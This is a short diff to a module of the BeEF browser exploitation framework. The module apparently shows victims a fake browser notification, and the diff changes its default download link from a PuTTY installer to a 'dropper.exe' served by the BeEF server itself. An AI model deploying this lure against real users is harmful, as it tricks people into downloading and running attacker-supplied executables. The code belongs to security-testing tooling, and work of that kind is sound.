@@ -6,8 +6,14 @@
 class Fake_notification_c < BeEF::Core::Command
 
   def self.options
+    @configuration = BeEF::Core::Configuration.instance
+    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
+    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
+    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
+    base_host = "#{proto}://#{beef_host}:#{beef_port}"
+
     return [
-      {'name' => 'url', 'ui_label' => 'URL', 'value' => 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe', 'width'=>'150px'},
+      {'name' => 'url', 'ui_label' => 'URL', 'value' => "#{base_host}/dropper.exe", 'width'=>'150px'},
       { 'name' => 'notification_text',
         'description' => 'Text displayed in the notification bar',
         'ui_label' => 'Notification text',
